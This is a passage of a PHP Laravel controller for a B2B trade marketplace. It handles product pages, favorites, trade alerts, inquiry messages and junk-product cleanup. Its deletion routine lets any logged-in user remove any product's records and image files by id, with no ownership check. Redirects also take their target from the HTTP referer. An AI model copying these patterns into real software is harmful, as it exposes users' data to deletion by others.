            $products=BdtdcProductToCategory::with(['cat_country','pro_to_cat_name','bdtdcProduct','bdtdcProduct.product_prices','bdtdcProduct.ProductUnit','bdtdcProduct.product_country','bdtdcProduct.customer_activity','bdtdcProduct.supplier_product','supp_pro_company','supp_pro_company_name','bdtdcCategory','pro_parent_cat','pro_images','pro_images_new'])->where('category_id',$cat_id)
                ->where('is_active',1)
                ->where('country_id',$id)
                ->orderBy('sort','desc')
                ->orderBy('product_id','desc')
                ->paginate();
                
            if(count($products) > 0){
            }else{
                $products=BdtdcProductToCategory::with(['cat_country','pro_to_cat_name','bdtdcProduct','bdtdcProduct.product_prices','bdtdcProduct.ProductUnit','bdtdcProduct.product_country','bdtdcProduct.customer_activity','bdtdcProduct.supplier_product','supp_pro_company','supp_pro_company_name','bdtdcCategory','pro_parent_cat','pro_images','pro_images_new'])->where('parent_id',$cat_id)
                    ->where('is_active',1)
                    ->where('country_id',$id)
                    ->orderBy('sort','desc')
                    ->orderBy('product_id','desc')
                    ->paginate();
            }
        }
    
        $category_id=BdtdcCategory::where('id',$cat_id)->first();

        $country=BdtdcCountry::with('country_region')->where('region_id',1)->get();

        $bdtdc_country_list=BdtdcCountry::where('region_id','!=',1)->get();
        $buyer_protection = false;
        $gold_supplier = false;
        $assessed_supplier = false;

        if($category_id->parent_id==0)
        {
            $parent_cats=BdtdcCategory::with('parent_cat')->where('id',$cat_id)->first();
        }
        else{
            $parent_cats=BdtdcCategory::with('parent_cat')->where('id',$category_id->parent_id)->first();
        }
        $name_combination = "";
        if($header){
            $name_combination=$cat_name;
            $cat_name_array = explode(',', $cat_name);
            $data['tags'] = explode(',',$header->tag);
            $name_combination = trim($name).' '.trim($cat_name);
        }

        return view::make('fontend.category.product',$data,['category_id'=>$category_id,'parent_cats'=>$parent_cats,'products'=>$products,'bdtdc_country_list'=>$bdtdc_country_list,'country'=>$country,'categoryid'=>$categoryid,'countryid'=>$countryid,'buyer_protection'=>$buyer_protection,'gold_supplier'=>$gold_supplier,'assessed_supplier'=>$assessed_supplier,'search_str'=>$search_str,'origin'=>$origin,'name_combination'=>$name_combination,'country_name'=>$country_name]);
    }

    public function get_product_show($name, $id)
    {
        $p_id=substr($id, 9, 10);
        if(Sentinel::getUser()){
            $products=BdtdcProduct::with(['logistic_info','bdtdcProductToCategory.other_wholesalers_products','bdtdcProductToCategory.other_wholesalers_products.pro_images_new','bdtdcProductToCategory.other_wholesalers_products.category_product_name','bdtdcProductToCategory.other_wholesalers_products.cat_pro_price','bdtdcProductToCategory.other_wholesalers_products.bdtdcProduct','bdtdcProductToCategory.other_wholesalers_products.bdtdcProduct.ProductUnit','customer_activity','bdtdcProductToCategory','bdtdcProductToCategory.other_wholesalers_products','bdtdcProductToCategory.bdtdcCategory','bdtdcProductToCategory.supp_pro_company','bdtdcProductToCategory.supp_pro_company.users','bdtdcProductToCategory.supp_pro_company_name','bdtdcProductToCategory.cat_country','product_name','supplier_product','supplier_product.suppliers','supplier_product.suppliers.business_types','product_image','ProductUnit','proimages','product_image_new','proimages_new','product_prices','ProductUnit','product_attribute','supplier_product.users','bdtdcProductToCategory.suppliers_other_products','bdtdcProductToCategory.suppliers_other_products.category_product_name','bdtdcProductToCategory.suppliers_other_products.pro_images_new','bdtdcProductToCategory.suppliers_other_products.cat_pro_price','bdtdcProductToCategory.suppliers_other_products.bdtdcProduct.ProductUnit','bdtdcProductToCategory.factoryinfo','bdtdcProductToCategory.factoryinfo.form_qc_staff','bdtdcProductToCategory.factoryinfo.form_factory_size','bdtdcProductToCategory.bdtdc_main_market','bdtdcProductToCategory.tradeinfo.form_export_percentage','bdtdcProductToCategory.tradeinfo.BdtdcFormValue','supplier_product.sup_main_products','supplier_product.suppliers.business_types','supplier_product.sup_companies.name_string','supplier_product.sup_companies','bdtdcProductToCategory.supplier_patents','customer_activity'=>function($subQuery){
                $subQuery->where('customer_id',Sentinel::getUser()->id);
            },'product_image_new'=>function($subQ){
                $subQ->orderBy('id','asc');
            },'proimages_new'=>function($subQ){
                $subQ->orderBy('id','asc');
            },'product_attribute'=>function($subQ){
                $subQ->orderBy('id','asc');
            }])
            ->where('id',$p_id)
            ->first();
        }
        else{
            $products=BdtdcProduct::with(['logistic_info','bdtdcProductToCategory.other_wholesalers_products','bdtdcProductToCategory.other_wholesalers_products.pro_images_new','bdtdcProductToCategory.other_wholesalers_products.category_product_name','bdtdcProductToCategory.other_wholesalers_products.cat_pro_price','bdtdcProductToCategory.other_wholesalers_products.bdtdcProduct','bdtdcProductToCategory.other_wholesalers_products.bdtdcProduct.ProductUnit','customer_activity','bdtdcProductToCategory','bdtdcProductToCategory.other_wholesalers_products','bdtdcProductToCategory.bdtdcCategory','bdtdcProductToCategory.supp_pro_company','bdtdcProductToCategory.supp_pro_company.users','bdtdcProductToCategory.supp_pro_company_name','bdtdcProductToCategory.cat_country','product_name','supplier_product','supplier_product.suppliers','supplier_product.suppliers.business_types','product_image','ProductUnit','proimages','product_image_new','proimages_new','product_prices','ProductUnit','product_attribute','product_attribute.bdtdcAttribute','supplier_product.users','bdtdcProductToCategory.suppliers_other_products','bdtdcProductToCategory.suppliers_other_products.category_product_name','bdtdcProductToCategory.suppliers_other_products.pro_images_new','bdtdcProductToCategory.suppliers_other_products.cat_pro_price','bdtdcProductToCategory.suppliers_other_products.bdtdcProduct.ProductUnit','bdtdcProductToCategory.factoryinfo','bdtdcProductToCategory.factoryinfo.form_qc_staff','bdtdcProductToCategory.factoryinfo.form_factory_size','bdtdcProductToCategory.bdtdc_main_market','bdtdcProductToCategory.tradeinfo.form_export_percentage','bdtdcProductToCategory.tradeinfo.BdtdcFormValue','supplier_product.sup_main_products','supplier_product.suppliers.business_types','supplier_product.sup_companies.name_string','supplier_product.sup_companies','bdtdcProductToCategory.supplier_patents','supplier_product.sup_companies.country','bdtdcProductToCategory.supp_pro_company.users','bdtdcProductToCategory.supplier_trademarks','bdtdcProductToCategory.other_wholesalers_products.cat_pro_price'])->where('id',$p_id)
                    ->first();
        }

        if($products){
            $products->visits = $products->visits + 1;
            $products->save();
        }
        if(!$products){
            return '<div style="margin:0 auto;width:23%;margin-top:10%;border:1px double rebeccapurple;"><h1 style="text-align:center;color:forestgreen;">No Product Found!!!</h1><p style="text-align:center;"><a style="text-decoration:none;" href="/">Go to home page</a></p></div>';
        }
            
        if($products->bdtdcProductToCategory){
            $parent_id=BdtdcCategory::where('id',$products->bdtdcProductToCategory->parent_id)->first();
            if(!$parent_id){
                $parent_id = (object) array('name'=>'no value on bdtdcProductToCategory',
                                            'id' =>'0',
                                        );
            }
        }else{
            $parent_id = (object) array('name'=>'no value on bdtdcProductToCategory',
                                            'id' =>'0',
                                        );
        }

        $units=DB::table('bdtdc_product_unit')->get();
        $data['title']='Buy '.$products->product_name->name.' '.($products->bdtdcProductToCategory->bdtdcCategory?$products->bdtdcProductToCategory->bdtdcCategory->name:'').' on buyerseller.asia';
        $data['keyword']=$products->product_name->meta_keyword;
        $data['description']='Find '.$products->product_name->name.' '.($products->bdtdcProductToCategory->bdtdcCategory?$products->bdtdcProductToCategory->bdtdcCategory->name:'').$parent_id->name.' from verified suppliers, exporters & manufacturers on buyerseller.asia';

        $share='true';

        $agent = new Agent();
        
        $device = $agent->device();
        // return view('mobile-view.content-view-mobile.product_details_show_m',$data,compact(['products','parent_id','units','share']));
         
        if($agent->isPhone())
        {
           return view('mobile-view.content-view-mobile.product_details_show_m',$data,compact(['products','parent_id','units','share']));
        }
        /*if($agent->isDestop())
        {
           return view('fontend.supplier.product_details_view',$data,compact(['products','parent_id','units','share']));
        }
        if($agent->isTab())
        {
           return view('fontend.supplier.product_details_view',$data,compact(['products','parent_id','units','share']));
        }*/
        else{
            return view('fontend.supplier.product_details_view',$data,compact(['products','parent_id','units','share']));
        }
    }

    public function make_favorite(Request $request){
        if(Sentinel::check()){
            $key=$request->input('key');
            $data=$request->input('data');
            $type=$request->input('type');
            // dd($type);
            $ip = $_SERVER['REMOTE_ADDR'];
            $date_added=date("Y-m-d");

            $user_id = Sentinel::getUser()->id;

            $data_insert = array
            (
                'customer_id'=>$user_id,  
                'key'=>$key,
                'data'=>$data,
                'ip'=>$ip,
                'type'=>$type,
                'date_added'=>$date_added,
            ); 
            // dd($data_insert);
            $favorite_details = BdtdcCustomerActivity::where('data',$data)->where('customer_id',$user_id)->first();
            // dd($favorite_details);
            $favorite_result = false;
            if($favorite_details){
                $favorite_result = BdtdcCustomerActivity::where('data',$data)->where('customer_id',$user_id)
                ->delete($data_insert);
                
            }else{
                $favorite_result = BdtdcCustomerActivity::insert($data_insert);
                
            }
           
           
            if($favorite_result){
                return 1;
            }
            else{
                return 0;}
        }

        else{
            return Redirect::to('ServiceLogin?continue='.URL::to($_SERVER['HTTP_REFERER']))->withFlashMessage('You must first login or register before accessing this page.');
        }

        /*if(Sentinel::check()){
            $key=$request->input('key');
            $data=$request->input('data');
            $ip = $_SERVER['REMOTE_ADDR'];
            $date_added=date("Y-m-d");

            $user_id = Sentinel::getUser()->id;

            $data_insert = array
            (
                'customer_id'=>$user_id,  
                'key'=>$key,
                'data'=>$data,
                'ip'=>$ip,
                'date_added'=>$date_added,
            ); 
            // dd($data_insert);
            $favorite_details = BdtdcCustomerActivity::where('data',$data)->where('customer_id',$user_id)->first();
            // dd($favorite_details);
            $favorite_result = false;
            if($favorite_details){
                $favorite_result = BdtdcCustomerActivity::where('data',$data)->where('customer_id',$user_id)
                ->delete($data_insert);
                
            }else{
                $favorite_result = BdtdcCustomerActivity::insert($data_insert);
                
            }
           
           
            if($favorite_result){
                return 1;
            }
            else{
                return 0;
            
        }

        else{
            return Redirect::to('ServiceLogin?continue='.URL::to($_SERVER['HTTP_REFERER']))->withFlashMessage('You must first login or register before accessing this page.');
        }}*/
    }

        public function remove_favorite(Request $request){

        if(Sentinel::check()){
            $data=$request->input('fav_id');
            // dd($data);
           
            $user_id = Sentinel::getUser()->id;

          
        
                $favorite_result = BdtdcCustomerActivity::where('data',$data)->where('customer_id',$user_id)
                ->delete();
                // return redirect::back();
          
           
            // dd($favorite_result);
            // $favorite_insert=DB::table('bdtdc_customer_activity')->insert($data_insert);
            if($favorite_result){
                return 1;
            }
            else{
                return 0;
            }
        }

        else{
            return Redirect::to('ServiceLogin?continue='.URL::to($_SERVER['HTTP_REFERER']))->withFlashMessage('You must first login or register before accessing this page.');
        }
    }

    public function favorite_product(){
        if(Sentinel::check())
        {
            $user_id =Sentinel::getUser()->id;
            $favorite_product=BdtdcCustomerActivity::with('bdtdc_product','bdtdc_product_category')
                            ->where('customer_id',$user_id)->where('type',1)->get();
             // dd($favorite_product);
            return view::make('fontend.favorite_product',compact('favorite_product'));
        }
        else{
            return redirect()->route('login')->withFlashMessage('You must first login or register before accessing this page.');
        }
    }

    public function favorite_supplier(){
        if(Sentinel::check()){
            $user_id =Sentinel::getUser()->id;
            $favorite_supplier=BdtdcCustomerActivity::with('bdtdc_company')
                            ->where('customer_id',$user_id)
                            ->where('type',2)
                            ->get();
            // dd($favorite_supplier);
            $com_d=DB::table('bdtdc_company_descriptions')->take(10)->get();
            // dd($com_d);
            return view::make('fontend.favorite_supplier',compact('favorite_supplier'));

        }
        else{
            return redirect()->route('login')->withFlashMessage('You must first login or register before accessing this page.');
        }
    }

    public function remove_favorite_supplier(Request $request){
        if(Sentinel::check()){
            $data=$request->input('fav_id');
            // dd($data);
           
            $user_id = Sentinel::getUser()->id;

          
        
                $favorite_result = BdtdcCustomerActivity::where('data',$data)->where('customer_id',$user_id)
                ->delete();
                // return redirect::back();
          
           
            // dd($favorite_result);
            // $favorite_insert=DB::table('bdtdc_customer_activity')->insert($data_insert);
            if($favorite_result){
                return 1;
            }
            else{
                return 0;
            }
        }

        else{
            return Redirect::to('ServiceLogin?continue='.URL::to($_SERVER['HTTP_REFERER']))->withFlashMessage('You must first login or register before accessing this page.');
        }
    }

    public function trade_alert(Request $request){
        
        if(Sentinel::check())
        {
            $user_id =Sentinel::getUser()->id;
            $supplier_type=BdtdcSupplier::where('user_id',$user_id)->first();
           
            $sp=DB::table('bdtdc_supplier_main_products')->where('supplier_id',$user_id)->first();
            // dd($sp);
            
            $p4=[];

            $product_name_1=$sp->product_name_1;
            if($product_name_1){
                if(trim($product_name_1)!=''){
                    $p1 = explode(',', $product_name_1);
                        foreach($p1 as $p1value){
                            // $p4 .= $p1value;
                            array_push($p4, $p1value);
                        }
                }
               
            }
            
            // dd($p1);
            $product_name_2=$sp->product_name_2;
            if($product_name_2){
                if(trim($product_name_2)!=''){
                $p2 = explode(',', $product_name_2);
                    foreach($p2 as $p2value){
                        // $p4 .= $p2value;
                        array_push($p4, $p2value);
                    }
            }
            }
            
            $product_name_3=$sp->product_name_3;
            if($product_name_3){
                if(trim($product_name_3)!=''){
                $p3 = explode(',', $product_name_3);
                    foreach($p3 as $p3value){
                        // $p4 .= $p3value;
                        array_push($p4, $p3value);
                    }
                }
            }


            // $main=implode(',', $p4);;
            // return $main;
            // dd($p4);
            $main_product_search='';
            // $main_product=$request->input('data_name');
            // dd($main_product);
            $main_product_search=BdtdcProductDescription::whereIn('name', $p4)->get();
            // dd($main_product_search);
            // $main_product=$request->input('main_product');
            // dd($main_product);
            /*if( $main_product){
                $main_product_search=BdtdcProductDescription::where('name','LIKE','%'.$main_product.'%')->get();
                 
            }*/
            /*$s=BdtdcSupplierInquery::with('inq_docs','inq_products_description')->take(10)->get();
            dd($s);*/



            $buying_request=BdtdcSupplierInquery::whereHas('inq_products_description', function ($query)  use ($p4){
                $query->with('industry_category_details')->whereIn('name',$p4);
                });
            // dd($buying_request);
        return view::make('fontend.trade_alert',compact('p4','main_product_search','buying_request'));

            
        }
        else{
            return redirect()->route('login')->withFlashMessage('You must first login or register before accessing this page.');
        }
    }

    public function main_product_search(Request $request){
         $main_product=$request->input('data_name');
            // dd($main_product);
            $main_product_search=BdtdcProductDescription::where('name','LIKE','%'.$main_product.'%')->get();
            // dd($main_product_search);
        return view::make('fontend.main_product_search',compact('main_product_search'));


    }

    public function message(Request $request){
        if(Sentinel::check())
        {
            $user_id = Sentinel::getUser()->id;
            $total_inq_today = BdtdcSupplierInquery::where('sender',$user_id)->whereDate('created_at', '=', date('Y-m-d'))->get();

            if($total_inq_today->count() >= 50){
                session()->flash('quotation_limit_alert', 'Maximum Buying Request(s) exceeded for today.');
                return view::make('fontend.supplier.sending_message_success');
            }

            $rules=array(
                'message'=>'required|min:20|max:8000',
                'unit_id'=>'required|integer',
                'quantity'=>'required|integer',
                );


            $validator = Validator::make($request->all(), $rules);
            if ($validator->fails())
            {
                return redirect::back()
                            ->withErrors($validator)
                            ->withInput(Input::all());                 
            }
            else
            {
                $input=  $request->only(['message','unit_id','quantity','product_id','product_owner_id']);
                // dd($input);
                //$product_id=$input['product_id'];
                //dd($product_id);
                /*$product_owner = DB::table('bdtdc_supplier_products as sp')
                                ->join('users as u','u.id','=','sp.supplier_id')
                                ->where('sp.product_id',$product_id)
                                ->first(['u.id as user_id']);*/
                //dd($product_owner);
                //$user_id=$product_owner->user_id;
                //return $user_id;
                //$product_owner_id=$product_owner->product_owner_id;
                //dd($product_owner_id); 
                $insert_data=array();
                $insert_data = array
                (
                'product_id'=>$input['product_id'], 
                'message'=>$input['message'],
                'unit_id'=> $input['unit_id'],
                'quantity'=> $input['quantity'],
                'product_owner_id'=>$request->product_owner_id,
                'sender' => $user_id,

                ); 
                
                ///dd($insert_data);
                $bdtdc = DB::table('bdtdc_supllier_inqueries')->insertGetId($insert_data);
                // dd($bdtdc);
                if($bdtdc){
                    //Notification
                    sendNotification(1, 'You have been received new Notification', Sentinel::getUser()->id, $request->product_owner_id, $bdtdc);
                    // End Notification
                    return view::make('fontend.supplier.sending_message_success');
                }else{
                    session()->flash('quotation_limit_alert', 'Message sending failed');
                    return view::make('fontend.supplier.sending_message_success');
                }
            }
        }
        else
        return Redirect::to('ServiceLogin?continue='.URL::to($_SERVER['HTTP_REFERER']))->withFlashMessage('You must first login or register before accessing this page.');
    }

    public function junk_product_form()
    {
        return view::make('fontend.supplier.junk_product_form');
    }

    public function x_junk_product($id){
        if(Sentinel::getUser()){}else{
            return 'login';
        }
        DB::beginTransaction();
        try{
            $p_image = DB::table('bdtdc_product_image')->where('product_id',$id)->get();
            if($p_image){
                foreach ($p_image as $img_name) {
                    if(file_exists("uploads/".$img_name->image)){
                        unlink("uploads/".$img_name->image);
                    }
                }
            }
        }
        catch(ValidationException $e){
            DB::rollback();
        }

        try{
            $p_images = DB::table('bdtdc_product_images')->where('product_id',$id)->get();
            if($p_images){
                foreach ($p_images as $img_name) {
                    $p_cat = BdtdcProductToCategory::where('product_id',$id)->first();
                    if($p_cat){
                        $fileName = 'bdtdc-product-image/'.trim($p_cat->pro_parent_cat->name).'/'.trim($p_cat->bdtdcCategory->name).'/'.$img_name->image;
                        if(file_exists($fileName)){
                            (unlink($fileName)) ? 'deleted!!' : 'was not able to deleted';
                        }
                    }else{
                        $img_array = explode('_', $img_name->image);
                        $parent_cat_name = BdtdcCategory::where('id',$img_array[1])->first(['name','id']);
                        $sub_cat_name = BdtdcCategory::where('id',$img_array[2])->first(['name','id']);
                        //The name of the directory that we need to create.
                        $fileName = 'bdtdc-product-image/'.trim($parent_cat_name->name).'/'.trim($sub_cat_name->name).'/'.$img_name->image;
                        if(file_exists($fileName)){
                             (unlink($fileName)) ? 'deleted!!' : 'was not able to deleted';
                        }
                    }
                }
            }
            
        }
        catch(ValidationException $e){
            DB::rollback();
        }

        try{
            $pro_attr = DB::table('bdtdc_product_attribute')->where('product_id',$id)->get();
            if($pro_attr){
                foreach ($pro_attr as $attr_value) {
                    DB::table('bdtdc_attributes')->where('id',$attr_value->attribute_id)->delete();
                }
            }
        }
        catch(ValidationException $e){
            DB::rollback();
        }

        try{
            DB::table('bdtdc_product')->where('id',$id)->delete();
            DB::table('bdtdc_product_description')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_to_category')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_to_wholesale_category')->where('product_id',$id)->delete();
            DB::table('bdtdc_limited_lime_offers')->where('product_id',$id)->delete();
            DB::table('bdtdc_logistic_infos')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_prices')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_image')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_images')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_attribute')->where('product_id',$id)->delete();
            DB::table('bdtdc_supplier_products')->where('product_id',$id)->delete();
        }
        catch(ValidationException $e){
            DB::rollback();
        }

        catch(\Exception $e)
        {
            DB::rollback();
            throw $e;
        }
        DB::commit();

        return "deleted";
        
    }
    

    public function delete_junk_products()
    {
        $BdtdcProductToCategory=BdtdcProductToCategory::with(['bdtdcProduct'])
                                ->get();
        foreach ($BdtdcProductToCategory as $ProductToCategory) {
            if($ProductToCategory->bdtdcProduct){
                
            }else{
                // echo $ProductToCategory->product_id."<br>";
                $this->x_junk_product($ProductToCategory->product_id);

            }
        }
        return 1;
    }

    public function dirToArray($dir) { 
   
       $result = array(); 
       $cdir = scandir($dir); 
       foreach ($cdir as $key => $value) 
       { 
          if (!in_array($value,array(".",".."))) 
          { 
             if (is_dir($dir . DIRECTORY_SEPARATOR . $value)) 
             { 
                $result[$value] = dirToArray($dir . DIRECTORY_SEPARATOR . $value); 
             } 
             else 
             { 
                $result[] = $value; 
             } 
          } 
       } 
       
       return $result; 
    }

    public function delete_junk_images()
    {
        $uploads = $this->dirToArray('uploads');
        // $bdtdc_product_image = $this->dirToArray('bdtdc-product-image');
        echo "<pre>";
        print_r ($uploads);
        echo "</pre>";
        // return 1;
    }

}
